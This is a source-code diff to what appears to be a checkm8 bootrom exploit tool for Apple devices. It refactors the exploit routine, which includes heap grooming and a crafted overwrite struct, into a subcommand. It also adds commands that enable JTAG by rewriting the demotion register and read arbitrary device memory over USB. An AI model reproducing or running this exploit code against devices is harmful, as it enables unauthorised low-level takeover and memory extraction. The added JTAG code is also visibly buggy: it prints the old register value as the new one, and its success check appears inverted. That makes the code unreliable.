@@ -6,7 +6,7 @@
 #include <stdio.h>
 #include <vector>
 
-#ifdef WIN32
+#ifdef _WIN32
 #include <windows.h>
 #elif _POSIX_C_SOURCE >= 199309L
 #include <time.h> // for nanosleep
@@ -17,6 +17,9 @@
 using namespace std;
 
 #include "dfu.h"
+#include "usbexec.h"
+
+enum class ECOMMAND { EXIT = 0, CHECKM8, DEMOTE, READ_U32, READ_U64 };
 
 const int PAYLOAD_OFFSET_ARMV7 = 384;
 const int PAYLOAD_SIZE_ARMV7 = 320;
@@ -305,7 +308,7 @@ typedef struct alignas(1) {
   uint32_t End = 0xbeefbeef;
 } t8010_overwrite;
 
-int main(int argc, char *argv[]) {
+void runCheckm8() {
   // Create device config
   t8010_overwrite Overwrite;
   assert(sizeof(t8010_overwrite) == 1524);
@@ -320,12 +323,12 @@ int main(int argc, char *argv[]) {
   DFU D;
   if (!D.acquire_device()) {
     printf("[!] Failed to find device!\n");
-    return 1;
+    return;
   }
 
   if (D.isExploited()) {
     printf("[!] Device is already exploited! Aborting!\n");
-    return 0;
+    return;
   }
 
   printf("[*] stage 1, heap grooming ...\n");
@@ -386,9 +389,136 @@ int main(int argc, char *argv[]) {
     printf("[!] Exploit failed! :(\n");
   }
   D.release_device();
+}
 
-  // Demote device
-  
-  
+void demoteDevice() {
+  DFU d;
+  d.acquire_device();
+  if (d.isExploited() == false) {
+    cout << "[!] Device has to be exploited first!\n";
+    return;
+  }
+
+  // Get serial number
+  auto SerialNumber = d.getSerialNumber();
+  d.release_device();
+
+  // Set demotion reg
+  USBEXEC U(SerialNumber);
+  uint32_t Value = U.read_memory_uint32(U.getDemotionReg());
+  printf("[*] DemotionReg: %X\n", Value);
+
+  printf("[*] Setting Value...\n");
+  uint32_t JTAG_ENABLED = Value & 0xFFFFFFFE;
+  U.write_memory_uint32(U.getDemotionReg(), JTAG_ENABLED);
+
+  uint32_t NewValue = U.read_memory_uint32(U.getDemotionReg());
+  printf("[*] New DemotionReg: %X\n", Value);
+  if (NewValue != Value) {
+    cout << "[!] Failed to enable the JTAG!\n";
+  } else {
+    cout << "[!] Succeeded to enable the JTAG!\n";
+  }
+}
+
+void read32(uint64_t address) {
+  DFU d;
+  d.acquire_device();
+  if (d.isExploited() == false) {
+    cout << "[!] Device has to be exploited first!\n";
+    return;
+  }
+
+  // Get serial number
+  auto SerialNumber = d.getSerialNumber();
+  d.release_device();
+
+  // Set demotion reg
+  USBEXEC U(SerialNumber);
+  uint32_t Value = U.read_memory_uint32(address);
+
+  printf("[*] [%lX] = %08X\n", address, Value);
+}
+
+void read64(uint64_t address) {
+  DFU d;
+  d.acquire_device();
+  if (d.isExploited() == false) {
+    cout << "[!] Device has to be exploited first!\n";
+    return;
+  }
+
+  // Get serial number
+  auto SerialNumber = d.getSerialNumber();
+  d.release_device();
+
+  // Set demotion reg
+  USBEXEC U(SerialNumber);
+  uint64_t Value = U.read_memory_uint64(address);
+
+  printf("[*] [%lX] = %016lX\n", address, Value);
+}
+
+ECOMMAND parseCommandLine(int argc, char *argv[]) {
+  if (argc < 2) {
+    cout << "Usage:\n";
+    cout << "checkm8          - execute checkm8 exploit\n";
+    cout << "enable_jtag      - enable the jtag in an exploited device\n";
+    cout << "read32 <address> - reads 32bit from the given address\n";
+    cout << "read64 <address> - reads 64bit from the given address\n";
+    cout << "\n";
+
+    return ECOMMAND::EXIT;
+  }
+
+  string Command = argv[1];
+  if (Command == "checkm8")
+    return ECOMMAND::CHECKM8;
+  else if (Command == "enable_jtag")
+    return ECOMMAND::DEMOTE;
+  else if (Command == "read32") {
+    if (argc < 3) {
+      cout << "[!] No address supplied!\n";
+      return ECOMMAND::EXIT;
+    }
+    return ECOMMAND::READ_U32;
+  } else if (Command == "read64") {
+    if (argc < 3) {
+      cout << "[!] No address supplied!\n";
+      return ECOMMAND::EXIT;
+    }
+    return ECOMMAND::READ_U64;
+  }
+
+  cout << "[!] Unknown command!\n";
+
+  return ECOMMAND::EXIT;
+}
+
+int main(int argc, char *argv[]) {
+  ECOMMAND C = parseCommandLine(argc, argv);
+  switch (C) {
+  case ECOMMAND::EXIT:
+    return 0;
+    break;
+  case ECOMMAND::CHECKM8:
+    runCheckm8();
+    break;
+  case ECOMMAND::DEMOTE:
+    demoteDevice();
+    break;
+  case ECOMMAND::READ_U32: {
+    uint64_t address = strtoul(argv[2], 0, 0);
+    read32(address);
+  } break;
+  case ECOMMAND::READ_U64: {
+    uint64_t address = strtoul(argv[2], 0, 0);
+    read64(address);
+  } break;
+  default:
+    // Do nothing
+    break;
+  }
+
   return 0;
 }
